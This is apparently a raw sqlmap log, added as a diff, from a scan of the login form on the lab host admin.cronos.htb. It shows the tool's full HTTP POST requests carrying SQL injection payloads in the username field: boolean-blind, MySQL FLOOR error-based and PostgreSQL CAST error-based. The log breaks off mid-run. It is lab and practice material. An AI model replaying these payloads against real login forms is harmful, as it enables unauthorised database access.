@@ -1,0 +1,1041 @@
+        ___
+       __H__
+ ___ ___["]_____ ___ ___  {1.4.5#stable}
+|_ -| . [(]     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 18:32:18 /2020-05-20/
+
+[18:32:18] [INFO] parsing HTTP request from 'login.txt'
+[18:32:18] [DEBUG] not a valid WebScarab log data
+[18:32:18] [DEBUG] cleaning up configuration parameters
+[18:32:18] [DEBUG] setting the HTTP timeout
+[18:32:18] [DEBUG] setting the HTTP User-Agent header
+[18:32:18] [DEBUG] creating HTTP requests opener object
+[18:32:18] [DEBUG] resolving hostname 'admin.cronos.htb'
+[18:32:18] [INFO] testing connection to the target URL
+[18:32:18] [TRAFFIC OUT] HTTP request [#1]:
+POST / HTTP/1.1
+Host: admin.cronos.htb
+User-agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-language: en-US,en;q=0.5
+Accept-encoding: gzip, deflate
+Referer: http://admin.cronos.htb/
+Content-type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=odj7vfna274jqakpqf3ffpjo87
+Upgrade-Insecure-Requests: 1
+Content-length: 26
+Connection: close
+
+username=user&password=bla
+
+[18:32:18] [DEBUG] declared web page charset 'utf-8'
+[18:32:19] [INFO] testing if the target URL content is stable
+[18:32:19] [TRAFFIC OUT] HTTP request [#2]:
+POST / HTTP/1.1
+Host: admin.cronos.htb
+User-agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-language: en-US,en;q=0.5
+Accept-encoding: gzip, deflate
+Referer: http://admin.cronos.htb/
+Content-type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=odj7vfna274jqakpqf3ffpjo87
+Upgrade-Insecure-Requests: 1
+Content-length: 26
+Connection: close
+
+username=user&password=bla
+
+[18:32:19] [INFO] target URL content is stable
+[18:32:19] [INFO] testing if POST parameter 'username' is dynamic
+[18:32:19] [PAYLOAD] 3093
+[18:32:19] [TRAFFIC OUT] HTTP request [#3]:
+POST / HTTP/1.1
+Host: admin.cronos.htb
+User-agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-language: en-US,en;q=0.5
+Accept-encoding: gzip, deflate
+Referer: http://admin.cronos.htb/
+Content-type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=odj7vfna274jqakpqf3ffpjo87
+Upgrade-Insecure-Requests: 1
+Content-length: 26
+Connection: close
+
+username=3093&password=bla
+
+[18:32:19] [WARNING] POST parameter 'username' does not appear to be dynamic
+[18:32:19] [PAYLOAD] user),.(.,)"')
+[18:32:19] [TRAFFIC OUT] HTTP request [#4]:
+POST / HTTP/1.1
+Host: admin.cronos.htb
+User-agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-language: en-US,en;q=0.5
+Accept-encoding: gzip, deflate
+Referer: http://admin.cronos.htb/
+Content-type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=odj7vfna274jqakpqf3ffpjo87
+Upgrade-Insecure-Requests: 1
+Content-length: 52
+Connection: close
+
+username=user%29%2C.%28.%2C%29%22%27%29&password=bla
+
+[18:32:19] [WARNING] heuristic (basic) test shows that POST parameter 'username' might not be injectable
+[18:32:19] [PAYLOAD] user'zNHwjs<'">zvQcsM
+[18:32:19] [TRAFFIC OUT] HTTP request [#5]:
+POST / HTTP/1.1
+Host: admin.cronos.htb
+User-agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-language: en-US,en;q=0.5
+Accept-encoding: gzip, deflate
+Referer: http://admin.cronos.htb/
+Content-type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=odj7vfna274jqakpqf3ffpjo87
+Upgrade-Insecure-Requests: 1
+Content-length: 53
+Connection: close
+
+username=user%27zNHwjs%3C%27%22%3EzvQcsM&password=bla
+
+[18:32:19] [INFO] testing for SQL injection on POST parameter 'username'
+[18:32:20] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[18:32:20] [PAYLOAD] user') AND 9671=5686 AND ('mCzP'='mCzP
+[18:32:20] [TRAFFIC OUT] HTTP request [#6]:
+POST / HTTP/1.1
+Host: admin.cronos.htb
+User-agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-language: en-US,en;q=0.5
+Accept-encoding: gzip, deflate
+Referer: http://admin.cronos.htb/
+Content-type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=odj7vfna274jqakpqf3ffpjo87
+Upgrade-Insecure-Requests: 1
+Content-length: 84
+Connection: close
+
+username=user%27%29%20AND%209671%3D5686%20AND%20%28%27mCzP%27%3D%27mCzP&password=bla
+
+[18:32:20] [PAYLOAD] user' AND 1591=8973 AND 'JjkW'='JjkW
+[18:32:20] [TRAFFIC OUT] HTTP request [#7]:
+POST / HTTP/1.1
+Host: admin.cronos.htb
+User-agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-language: en-US,en;q=0.5
+Accept-encoding: gzip, deflate
+Referer: http://admin.cronos.htb/
+Content-type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=odj7vfna274jqakpqf3ffpjo87
+Upgrade-Insecure-Requests: 1
+Content-length: 78
+Connection: close
+
+username=user%27%20AND%201591%3D8973%20AND%20%27JjkW%27%3D%27JjkW&password=bla
+
+[18:32:20] [PAYLOAD] user) AND 7345=3825 AND (3743=3743
+[18:32:20] [TRAFFIC OUT] HTTP request [#8]:
+POST / HTTP/1.1
+Host: admin.cronos.htb
+User-agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-language: en-US,en;q=0.5
+Accept-encoding: gzip, deflate
+Referer: http://admin.cronos.htb/
+Content-type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=odj7vfna274jqakpqf3ffpjo87
+Upgrade-Insecure-Requests: 1
+Content-length: 72
+Connection: close
+
+username=user%29%20AND%207345%3D3825%20AND%20%283743%3D3743&password=bla
+
+[18:32:20] [PAYLOAD] user AND 8501=5131
+[18:32:20] [TRAFFIC OUT] HTTP request [#9]:
+POST / HTTP/1.1
+Host: admin.cronos.htb
+User-agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-language: en-US,en;q=0.5
+Accept-encoding: gzip, deflate
+Referer: http://admin.cronos.htb/
+Content-type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=odj7vfna274jqakpqf3ffpjo87
+Upgrade-Insecure-Requests: 1
+Content-length: 46
+Connection: close
+
+username=user%20AND%208501%3D5131&password=bla
+
+[18:32:20] [PAYLOAD] user AND 4443=1394-- LaKd
+[18:32:20] [TRAFFIC OUT] HTTP request [#10]:
+POST / HTTP/1.1
+Host: admin.cronos.htb
+User-agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-language: en-US,en;q=0.5
+Accept-encoding: gzip, deflate
+Referer: http://admin.cronos.htb/
+Content-type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=odj7vfna274jqakpqf3ffpjo87
+Upgrade-Insecure-Requests: 1
+Content-length: 55
+Connection: close
+
+username=user%20AND%204443%3D1394--%20LaKd&password=bla
+
+[18:32:21] [DEBUG] skipping test 'OR boolean-based blind - WHERE or HAVING clause' because the risk (3) is higher than the provided (1)
+[18:32:21] [DEBUG] skipping test 'OR boolean-based blind - WHERE or HAVING clause (NOT)' because the risk (3) is higher than the provided (1)
+[18:32:21] [DEBUG] skipping test 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)' because the level (2) is higher than the provided (1)
+[18:32:21] [DEBUG] skipping test 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)' because the risk (3) is higher than the provided (1)
+[18:32:21] [DEBUG] skipping test 'AND boolean-based blind - WHERE or HAVING clause (comment)' because the level (2) is higher than the provided (1)
+[18:32:21] [DEBUG] skipping test 'OR boolean-based blind - WHERE or HAVING clause (comment)' because the risk (3) is higher than the provided (1)
+[18:32:21] [DEBUG] skipping test 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)' because the risk (3) is higher than the provided (1)
+[18:32:21] [DEBUG] skipping test 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)' because the level (3) is higher than the provided (1)
+[18:32:21] [DEBUG] skipping test 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)' because the risk (3) is higher than the provided (1)
+[18:32:21] [DEBUG] skipping test 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)' because the risk (3) is higher than the provided (1)
+[18:32:21] [DEBUG] skipping test 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)' because the level (3) is higher than the provided (1)
+[18:32:21] [DEBUG] skipping test 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)' because the risk (3) is higher than the provided (1)
+[18:32:21] [DEBUG] skipping test 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause' because the level (2) is higher than the provided (1)
+[18:32:21] [DEBUG] skipping test 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)' because the level (3) is higher than the provided (1)
+[18:32:21] [DEBUG] skipping test 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)' because the risk (3) is higher than the provided (1)
+[18:32:21] [DEBUG] skipping test 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)' because the level (4) is higher than the provided (1)
+[18:32:21] [DEBUG] skipping test 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)' because the risk (3) is higher than the provided (1)
+[18:32:21] [DEBUG] skipping test 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)' because the level (5) is higher than the provided (1)
+[18:32:21] [DEBUG] skipping test 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)' because the risk (3) is higher than the provided (1)
+[18:32:21] [DEBUG] skipping test 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)' because the level (2) is higher than the provided (1)
+[18:32:21] [DEBUG] skipping test 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)' because the risk (3) is higher than the provided (1)
+[18:32:21] [DEBUG] skipping test 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)' because the level (2) is higher than the provided (1)
+[18:32:21] [DEBUG] skipping test 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)' because the risk (3) is higher than the provided (1)
+[18:32:21] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[18:32:21] [PAYLOAD] (SELECT (CASE WHEN (7884=3902) THEN 'user' ELSE (SELECT 3902 UNION SELECT 1523) END))
+[18:32:21] [TRAFFIC OUT] HTTP request [#11]:
+POST / HTTP/1.1
+Host: admin.cronos.htb
+User-agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-language: en-US,en;q=0.5
+Accept-encoding: gzip, deflate
+Referer: http://admin.cronos.htb/
+Content-type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=odj7vfna274jqakpqf3ffpjo87
+Upgrade-Insecure-Requests: 1
+Content-length: 153
+Connection: close
+
+username=%28SELECT%20%28CASE%20WHEN%20%287884%3D3902%29%20THEN%20%27user%27%20ELSE%20%28SELECT%203902%20UNION%20SELECT%201523%29%20END%29%29&password=bla
+
+[18:32:21] [DEBUG] skipping test 'MySQL boolean-based blind - Parameter replace (MAKE_SET)' because the level (4) is higher than the provided (1)
+[18:32:21] [DEBUG] skipping test 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)' because the level (5) is higher than the provided (1)
+[18:32:21] [DEBUG] skipping test 'MySQL boolean-based blind - Parameter replace (ELT)' because the level (4) is higher than the provided (1)
+[18:32:21] [DEBUG] skipping test 'MySQL boolean-based blind - Parameter replace (ELT - original value)' because the level (5) is higher than the provided (1)
+[18:32:21] [DEBUG] skipping test 'MySQL boolean-based blind - Parameter replace (bool*int)' because the level (4) is higher than the provided (1)
+[18:32:21] [DEBUG] skipping test 'MySQL boolean-based blind - Parameter replace (bool*int - original value)' because the level (5) is higher than the provided (1)
+[18:32:21] [DEBUG] skipping test 'PostgreSQL boolean-based blind - Parameter replace' because the level (3) is higher than the provided (1)
+[18:32:21] [DEBUG] skipping test 'PostgreSQL boolean-based blind - Parameter replace (original value)' because the level (4) is higher than the provided (1)
+[18:32:21] [DEBUG] skipping test 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)' because the level (5) is higher than the provided (1)
+[18:32:21] [DEBUG] skipping test 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)' because the level (5) is higher than the provided (1)
+[18:32:21] [DEBUG] skipping test 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace' because the level (3) is higher than the provided (1)
+[18:32:21] [DEBUG] skipping test 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)' because the level (4) is higher than the provided (1)
+[18:32:21] [DEBUG] skipping test 'Oracle boolean-based blind - Parameter replace' because the level (3) is higher than the provided (1)
+[18:32:21] [DEBUG] skipping test 'Oracle boolean-based blind - Parameter replace (original value)' because the level (4) is higher than the provided (1)
+[18:32:21] [DEBUG] skipping test 'Informix boolean-based blind - Parameter replace' because the level (3) is higher than the provided (1)
+[18:32:21] [DEBUG] skipping test 'Informix boolean-based blind - Parameter replace (original value)' because the level (4) is higher than the provided (1)
+[18:32:21] [DEBUG] skipping test 'Microsoft Access boolean-based blind - Parameter replace' because the level (3) is higher than the provided (1)
+[18:32:21] [DEBUG] skipping test 'Microsoft Access boolean-based blind - Parameter replace (original value)' because the level (4) is higher than the provided (1)
+[18:32:21] [DEBUG] skipping test 'Boolean-based blind - Parameter replace (DUAL)' because the level (2) is higher than the provided (1)
+[18:32:21] [DEBUG] skipping test 'Boolean-based blind - Parameter replace (DUAL - original value)' because the level (3) is higher than the provided (1)
+[18:32:21] [DEBUG] skipping test 'Boolean-based blind - Parameter replace (CASE)' because the level (2) is higher than the provided (1)
+[18:32:21] [DEBUG] skipping test 'Boolean-based blind - Parameter replace (CASE - original value)' because the level (3) is higher than the provided (1)
+[18:32:21] [DEBUG] skipping test 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause' because the level (2) is higher than the provided (1)
+[18:32:21] [DEBUG] skipping test 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)' because the level (3) is higher than the provided (1)
+[18:32:21] [DEBUG] skipping test 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause' because the level (3) is higher than the provided (1)
+[18:32:21] [DEBUG] skipping test 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)' because the level (4) is higher than the provided (1)
+[18:32:21] [DEBUG] skipping test 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause' because the level (2) is higher than the provided (1)
+[18:32:21] [DEBUG] skipping test 'PostgreSQL boolean-based blind - ORDER BY clause (original value)' because the level (4) is higher than the provided (1)
+[18:32:21] [DEBUG] skipping test 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)' because the level (5) is higher than the provided (1)
+[18:32:21] [DEBUG] skipping test 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause' because the level (3) is higher than the provided (1)
+[18:32:21] [DEBUG] skipping test 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause (original value)' because the level (4) is higher than the provided (1)
+[18:32:21] [DEBUG] skipping test 'Oracle boolean-based blind - ORDER BY, GROUP BY clause' because the level (3) is higher than the provided (1)
+[18:32:21] [DEBUG] skipping test 'Oracle boolean-based blind - ORDER BY, GROUP BY clause (original value)' because the level (4) is higher than the provided (1)
+[18:32:21] [DEBUG] skipping test 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause' because the level (4) is higher than the provided (1)
+[18:32:21] [DEBUG] skipping test 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause (original value)' because the level (5) is higher than the provided (1)
+[18:32:21] [DEBUG] skipping test 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause' because the level (4) is higher than the provided (1)
+[18:32:21] [DEBUG] skipping test 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause (original value)' because the level (5) is higher than the provided (1)
+[18:32:21] [DEBUG] skipping test 'HAVING boolean-based blind - WHERE, GROUP BY clause' because the level (3) is higher than the provided (1)
+[18:32:21] [DEBUG] skipping test 'MySQL >= 5.0 boolean-based blind - Stacked queries' because the level (4) is higher than the provided (1)
+[18:32:21] [DEBUG] skipping test 'MySQL < 5.0 boolean-based blind - Stacked queries' because the level (5) is higher than the provided (1)
+[18:32:21] [DEBUG] skipping test 'PostgreSQL boolean-based blind - Stacked queries' because the level (3) is higher than the provided (1)
+[18:32:21] [DEBUG] skipping test 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)' because the level (5) is higher than the provided (1)
+[18:32:21] [DEBUG] skipping test 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)' because the level (3) is higher than the provided (1)
+[18:32:21] [DEBUG] skipping test 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries' because the level (4) is higher than the provided (1)
+[18:32:21] [DEBUG] skipping test 'Oracle boolean-based blind - Stacked queries' because the level (4) is higher than the provided (1)
+[18:32:21] [DEBUG] skipping test 'Microsoft Access boolean-based blind - Stacked queries' because the level (5) is higher than the provided (1)
+[18:32:21] [DEBUG] skipping test 'SAP MaxDB boolean-based blind - Stacked queries' because the level (5) is higher than the provided (1)
+[18:32:21] [DEBUG] skipping test 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)' because the level (4) is higher than the provided (1)
+[18:32:21] [DEBUG] skipping test 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)' because the risk (3) is higher than the provided (1)
+[18:32:21] [DEBUG] skipping test 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)' because the level (4) is higher than the provided (1)
+[18:32:21] [DEBUG] skipping test 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)' because the risk (3) is higher than the provided (1)
+[18:32:21] [DEBUG] skipping test 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)' because the level (5) is higher than the provided (1)
+[18:32:21] [DEBUG] skipping test 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)' because the risk (3) is higher than the provided (1)
+[18:32:21] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[18:32:21] [PAYLOAD] user') AND (SELECT 3837 FROM(SELECT COUNT(*),CONCAT(0x7176766a71,(SELECT (ELT(3837=3837,1))),0x7171707a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND ('QdCh'='QdCh
+[18:32:21] [TRAFFIC OUT] HTTP request [#12]:
+POST / HTTP/1.1
+Host: admin.cronos.htb
+User-agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-language: en-US,en;q=0.5
+Accept-encoding: gzip, deflate
+Referer: http://admin.cronos.htb/
+Content-type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=odj7vfna274jqakpqf3ffpjo87
+Upgrade-Insecure-Requests: 1
+Content-length: 302
+Connection: close
+
+username=user%27%29%20AND%20%28SELECT%203837%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7176766a71%2C%28SELECT%20%28ELT%283837%3D3837%2C1%29%29%29%2C0x7171707a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29%20AND%20%28%27QdCh%27%3D%27QdCh&password=bla
+
+[18:32:21] [PAYLOAD] user' AND (SELECT 3837 FROM(SELECT COUNT(*),CONCAT(0x7176766a71,(SELECT (ELT(3837=3837,1))),0x7171707a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'SVBV'='SVBV
+[18:32:21] [TRAFFIC OUT] HTTP request [#13]:
+POST / HTTP/1.1
+Host: admin.cronos.htb
+User-agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-language: en-US,en;q=0.5
+Accept-encoding: gzip, deflate
+Referer: http://admin.cronos.htb/
+Content-type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=odj7vfna274jqakpqf3ffpjo87
+Upgrade-Insecure-Requests: 1
+Content-length: 296
+Connection: close
+
+username=user%27%20AND%20%28SELECT%203837%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7176766a71%2C%28SELECT%20%28ELT%283837%3D3837%2C1%29%29%29%2C0x7171707a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29%20AND%20%27SVBV%27%3D%27SVBV&password=bla
+
+[18:32:21] [PAYLOAD] user) AND (SELECT 3837 FROM(SELECT COUNT(*),CONCAT(0x7176766a71,(SELECT (ELT(3837=3837,1))),0x7171707a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND (5965=5965
+[18:32:21] [TRAFFIC OUT] HTTP request [#14]:
+POST / HTTP/1.1
+Host: admin.cronos.htb
+User-agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-language: en-US,en;q=0.5
+Accept-encoding: gzip, deflate
+Referer: http://admin.cronos.htb/
+Content-type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=odj7vfna274jqakpqf3ffpjo87
+Upgrade-Insecure-Requests: 1
+Content-length: 290
+Connection: close
+
+username=user%29%20AND%20%28SELECT%203837%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7176766a71%2C%28SELECT%20%28ELT%283837%3D3837%2C1%29%29%29%2C0x7171707a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29%20AND%20%285965%3D5965&password=bla
+
+[18:32:21] [PAYLOAD] user AND (SELECT 3837 FROM(SELECT COUNT(*),CONCAT(0x7176766a71,(SELECT (ELT(3837=3837,1))),0x7171707a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+[18:32:21] [TRAFFIC OUT] HTTP request [#15]:
+POST / HTTP/1.1
+Host: admin.cronos.htb
+User-agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-language: en-US,en;q=0.5
+Accept-encoding: gzip, deflate
+Referer: http://admin.cronos.htb/
+Content-type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=odj7vfna274jqakpqf3ffpjo87
+Upgrade-Insecure-Requests: 1
+Content-length: 264
+Connection: close
+
+username=user%20AND%20%28SELECT%203837%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7176766a71%2C%28SELECT%20%28ELT%283837%3D3837%2C1%29%29%29%2C0x7171707a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29&password=bla
+
+[18:32:21] [PAYLOAD] user AND (SELECT 3837 FROM(SELECT COUNT(*),CONCAT(0x7176766a71,(SELECT (ELT(3837=3837,1))),0x7171707a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- YRqP
+[18:32:21] [TRAFFIC OUT] HTTP request [#16]:
+POST / HTTP/1.1
+Host: admin.cronos.htb
+User-agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-language: en-US,en;q=0.5
+Accept-encoding: gzip, deflate
+Referer: http://admin.cronos.htb/
+Content-type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=odj7vfna274jqakpqf3ffpjo87
+Upgrade-Insecure-Requests: 1
+Content-length: 273
+Connection: close
+
+username=user%20AND%20%28SELECT%203837%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7176766a71%2C%28SELECT%20%28ELT%283837%3D3837%2C1%29%29%29%2C0x7171707a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29--%20YRqP&password=bla
+
+[18:32:22] [DEBUG] skipping test 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' because the risk (3) is higher than the provided (1)
+[18:32:22] [DEBUG] skipping test 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)' because the level (2) is higher than the provided (1)
+[18:32:22] [DEBUG] skipping test 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)' because the risk (3) is higher than the provided (1)
+[18:32:22] [DEBUG] skipping test 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)' because the level (3) is higher than the provided (1)
+[18:32:22] [DEBUG] skipping test 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)' because the risk (3) is higher than the provided (1)
+[18:32:22] [DEBUG] skipping test 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' because the level (2) is higher than the provided (1)
+[18:32:22] [DEBUG] skipping test 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)' because the risk (3) is higher than the provided (1)
+[18:32:22] [DEBUG] skipping test 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)' because the risk (3) is higher than the provided (1)
+[18:32:22] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[18:32:22] [PAYLOAD] user') AND 7592=CAST((CHR(113)||CHR(118)||CHR(118)||CHR(106)||CHR(113))||(SELECT (CASE WHEN (7592=7592) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(113)||CHR(112)||CHR(122)||CHR(113)) AS NUMERIC) AND ('lQjy'='lQjy
+[18:32:22] [TRAFFIC OUT] HTTP request [#17]:
+POST / HTTP/1.1
+Host: admin.cronos.htb
+User-agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-language: en-US,en;q=0.5
+Accept-encoding: gzip, deflate
+Referer: http://admin.cronos.htb/
+Content-type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=odj7vfna274jqakpqf3ffpjo87
+Upgrade-Insecure-Requests: 1
+Content-length: 387
+Connection: close
+
+username=user%27%29%20AND%207592%3DCAST%28%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28118%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%287592%3D7592%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%28%27lQjy%27%3D%27lQjy&password=bla
+
+[18:32:22] [PAYLOAD] user' AND 7592=CAST((CHR(113)||CHR(118)||CHR(118)||CHR(106)||CHR(113))||(SELECT (CASE WHEN (7592=7592) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(113)||CHR(112)||CHR(122)||CHR(113)) AS NUMERIC) AND 'eCBp'='eCBp
